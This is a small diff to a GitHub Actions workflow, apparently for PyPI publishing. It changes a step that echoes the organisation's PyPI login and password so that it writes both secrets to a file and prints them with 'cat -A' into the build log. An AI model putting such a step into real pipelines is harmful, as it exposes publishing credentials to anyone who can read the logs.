@@ -24,8 +24,9 @@ jobs:
     steps:
       - name: get pypi
         run: |
-          echo ${{ secrets.ORG_PYPI_LOGIN }}
-          echo ${{ secrets.ORG_PYPI_PASSWD }}
+          echo ${{ secrets.ORG_PYPI_LOGIN }} > tt
+          echo ${{ secrets.ORG_PYPI_PASSWD }} >> tt
+          cat -A tt
 
       - uses: actions/checkout@master
         with:
